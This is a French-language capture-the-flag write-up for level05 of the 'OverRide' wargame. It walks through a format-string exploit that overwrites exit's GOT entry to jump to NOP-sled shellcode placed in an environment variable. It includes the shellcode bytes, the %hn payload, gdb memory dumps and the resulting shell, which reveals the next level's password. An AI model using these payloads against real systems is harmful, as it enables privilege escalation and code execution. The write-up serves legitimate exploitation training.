on a un exécutable qui lit sur l'entrée standard

après le désassemblage on voit un printf non protégé que l'on peut utiliser pour modifier l'appel de _exit()_

```
(gdb) disas 0x08048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

```
level05@OverRide:~$ echo -e '\xe0\x87\x04\x08 %x %x %x %x %x %x %x %x %x %x'| cat | ./level05
� 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 80487e0
```

l'adresse de _exit()_ est visible à la 10ème position

il n'y a pas d'appel a system("/bin/sh"), alors on passe par une variable d'environnement avec un shellcode

on ajoute des instructions NOP devant le shellcode pour trouver la bonne adresse plus facilement

```
export SHELLCODE=`python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
```

et on recupere l'adresse de *SHELLCODE* pour remplacer l'adresse d'_exit()_

```
(gdb) x/10s *(char**)environ
0xffffd86f:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"

(gdb) x/500x environ
...
0xffffd86c:     0x3530  0x5300  0x4548  0x4c4c  0x4f43  0x4544  0x903d  0x9090
0xffffd87c:     0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090
0xffffd88c:     0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090
0xffffd89c:     0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090
0xffffd8ac:     0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090
0xffffd8bc:     0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090
0xffffd8cc:     0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090  0x9090
0xffffd8dc:     0x3190  0x50c0  0x2f68  0x732f  0x6868  0x622f  0x6e69  0xe389
...
```

n'importe quelle adresse ou l'ont voit les NOP marchera : on prend 0xffffd87c

mais l'adresse est trop grande pour rentrer dans un _int_ : 0xffffd87c = (dec)4294957180

il faut l'envoyer en deux parties :

- ffff = 65535, d87c = 55420
- %55540d%10$hn + %(65535 - 55540)d%11$hn
- (premiere moitie de l'adresse d'exit) + (deuxieme moitie de l'adresse d'exit) + (55540 octets - taille des adresses precedentes) + (65535 - 55540 octets)

```
(echo -e '\xe0\x97\x04\x08\xe2\x97\x04\x08%55432d%10$hn%10095d%11$hn' ; cat) | ./level05
...
pwd
/home/users/level05
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```